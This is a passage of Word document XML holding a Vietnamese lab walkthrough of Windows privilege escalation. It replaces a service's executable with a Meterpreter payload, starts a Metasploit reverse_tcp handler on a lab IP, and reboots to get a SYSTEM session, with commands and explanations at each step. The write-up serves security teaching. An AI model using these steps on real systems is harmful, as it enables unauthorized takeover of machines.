                      <a:ext cx="6152515" cy="3033395"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9C89BC" w14:textId="04990055" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tải payload lên thư mục người dùng DumbUser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="665CD985" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1311B68F" w14:textId="14717B0E" w:rsidR="006A2813" w:rsidRPr="001A1844" w:rsidRDefault="001A1844">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001A1844">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>upload SecurityService.exe "C:\Users\DumbUser"</w:t>
      </w:r>
      <w:r w:rsidR="00000000" w:rsidRPr="001A1844">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29954D5D" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Payload được tải lên thư mục mà người dùng có quyền ghi. Lệnh shell chuyển từ Meterpreter sang Command Prompt của Windows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA7B513" w14:textId="67A42018" w:rsidR="001A1844" w:rsidRDefault="001A1844">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1E70199A" wp14:editId="3830367E">
            <wp:extent cx="6152515" cy="1353185"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="85371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12986" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId20"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1353185"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC5B237" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>6. Thay thế tệp thực thi của dịch vụ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E52C21F" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Xóa tệp thực thi cũ của SecurityService.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07EDE673" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CAE6C52" w14:textId="77777777" w:rsidR="006A2813" w:rsidRPr="001A1844" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001A1844">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>del "C:\Program Files (x86)\PCProtect\SecurityService.exe"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7E5583" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Nếu quyền NTFS cho phép, người dùng có thể xóa tệp thực thi hợp lệ của dịch vụ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BA3669F" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Chuyển payload vào đúng đường dẫn của dịch vụ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A4A80C" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581D6F7C" w14:textId="77777777" w:rsidR="001A1844" w:rsidRDefault="001A1844">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001A1844">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>move "C:\Users\DumbUser\Downloads\SecurityService.exe" "C:\Program Files (x86)\PCProtect\SecurityService.exe"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C89553" w14:textId="0A541E5C" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Payload được đặt đúng tên và đúng đường dẫn mà Windows sẽ gọi khi SecurityService khởi động.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4290DA1E" w14:textId="0CE34321" w:rsidR="006A2813" w:rsidRDefault="001A1844">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="059313B2" wp14:editId="145C0BF9">
            <wp:extent cx="6152515" cy="1567180"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="20797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71263" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId21"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1567180"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Trong trường hợp cần giữ lại tệp gốc, có thể đổi tên trước khi thay thế:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0C83FE" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3091F8" w14:textId="77777777" w:rsidR="006A2813" w:rsidRPr="007B0CCA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007B0CCA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>ren "C:\Program Files (x86)\PCProtect\SecurityService.exe" SecurityServicezzz.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5CCA1C" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C7BFE6C" w14:textId="77777777" w:rsidR="007B0CCA" w:rsidRPr="007B0CCA" w:rsidRDefault="007B0CCA" w:rsidP="007B0CCA">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007B0CCA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>move "C:\Users\DumbUser\Downloads\SecurityService.exe" "C:\Program Files (x86)\PCProtect\SecurityService.exe"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE2C69B" w14:textId="3A662A80" w:rsidR="007B0CCA" w:rsidRDefault="007B0CCA">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7C7952BA" wp14:editId="5F837FE2">
            <wp:extent cx="6152515" cy="953770"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="12173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97416" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId22"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="953770"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F7E6CA" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>7. Mở handler và kích hoạt payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="765DAC65" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Mở Metasploit và tạo trình lắng nghe cho payload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AB96CE" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC516E9" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>use multi/handler</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>set LHOST 192.168.56.105</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>set LPORT 4445</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>set PAYLOAD windows/x64/meterpreter/reverse_tcp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230C935C" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Handler phải sử dụng đúng payload, địa chỉ IP và cổng đã cấu hình trong tệp SecurityService.exe. Sau khi chạy, Metasploit chờ kết nối từ máy Windows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D62BB54" w14:textId="788D380A" w:rsidR="006A2813" w:rsidRDefault="007B0CCA">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5CABC3C1" wp14:editId="4762FEA4">
            <wp:extent cx="6152515" cy="1581785"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="171746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60181" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId23"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1581785"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Khởi động lại máy Windows để dịch vụ tự động chạy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB963AA" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76314054" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>shutdown /r</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7DD2F8" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Khi máy khởi động lại, SecurityService gọi tệp SecurityService.exe đã bị thay thế. Nếu dịch vụ chạy với quyền SYSTEM, phiên Meterpreter mới cũng nhận quyền SYSTEM.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B9A2A8" w14:textId="1D888B03" w:rsidR="007B0CCA" w:rsidRDefault="007B0CCA">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1A49A7BE" wp14:editId="08626A0A">
            <wp:extent cx="6152515" cy="766445"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="81014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49793" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId24"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="766445"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7654019D" w14:textId="77777777" w:rsidR="00DD2A5D" w:rsidRDefault="007B0CCA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="70A76A58" wp14:editId="17F288DE">
            <wp:extent cx="6152515" cy="4376420"/>
            <wp:effectExtent l="0" t="0" r="635" b="5080"/>
            <wp:docPr id="11305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3310" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId25"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="4376420"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEE8BB9" w14:textId="2E4C06A1" w:rsidR="00DD2A5D" w:rsidRDefault="00DD2A5D">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="35A72D93" wp14:editId="3732DBBC">
            <wp:extent cx="6152515" cy="1251585"/>
            <wp:effectExtent l="0" t="0" r="635" b="5715"/>
            <wp:docPr id="76026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67765" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId26"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1251585"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB22CAF" w14:textId="4FE74522" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>8. Ổn định phiên truy cập và sử dụng EaST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D68ECF2" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Di chuyển Meterpreter sang tiến trình ổn định hơn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D56E2AB" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1942A366" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>run post/windows/manage/migrate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C833B66" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Module migrate tự động chọn một tiến trình thích hợp để chuyển phiên Meterpreter, giúp hạn chế mất kết nối khi tiến trình dịch vụ kết thúc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689B630B" w14:textId="03482E5A" w:rsidR="002C44B9" w:rsidRDefault="002C44B9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0326F144" wp14:editId="08026486">
            <wp:extent cx="5924550" cy="1704975"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="55132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25103" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId27"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5924550" cy="1704975"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="418A8C80" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Truy cập thư mục công cụ EaST.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B3CD92C" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6864628B" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>cd EaST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E256E8C" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Di chuyển vào thư mục EaST để tiếp tục kiểm tra hoặc hỗ trợ leo quyền trong môi trường Windows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F4255D" w14:textId="06443026" w:rsidR="00092EF9" w:rsidRDefault="00092EF9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="00F7D9DB" wp14:editId="486A1016">
            <wp:extent cx="6152515" cy="537210"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="67167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2499" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId28"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="537210"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EAF5214" w14:textId="58695985" w:rsidR="00092EF9" w:rsidRDefault="00092EF9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5C9C3548" wp14:editId="726CC408">
            <wp:extent cx="6152515" cy="2263775"/>
            <wp:effectExtent l="0" t="0" r="635" b="3175"/>
            <wp:docPr id="174632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27670" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId29"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2263775"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="71593E9F" w14:textId="158981EF" w:rsidR="00092EF9" w:rsidRDefault="00092EF9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="574A7707" wp14:editId="3BEC2496">
            <wp:extent cx="6152515" cy="3784600"/>
            <wp:effectExtent l="0" t="0" r="635" b="6350"/>
            <wp:docPr id="47960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05878" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId30"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="3784600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BA1533" w14:textId="595C5ADB" w:rsidR="00092EF9" w:rsidRDefault="00092EF9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="471660EB" wp14:editId="470A6DAD">
            <wp:extent cx="6152515" cy="2662555"/>
            <wp:effectExtent l="0" t="0" r="635" b="4445"/>
            <wp:docPr id="72202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6870" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId31"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2662555"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0466CA57" w14:textId="13013D68" w:rsidR="00092EF9" w:rsidRDefault="00092EF9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="319D7D0C" wp14:editId="01D30D08">
            <wp:extent cx="6010275" cy="2152650"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="68097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78726" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId32"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6010275" cy="2152650"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FE6903" w14:textId="28600742" w:rsidR="00092EF9" w:rsidRDefault="00092EF9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="07033304" wp14:editId="1CFFF86D">
            <wp:extent cx="6152515" cy="3015615"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="207664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41606" name=""/>
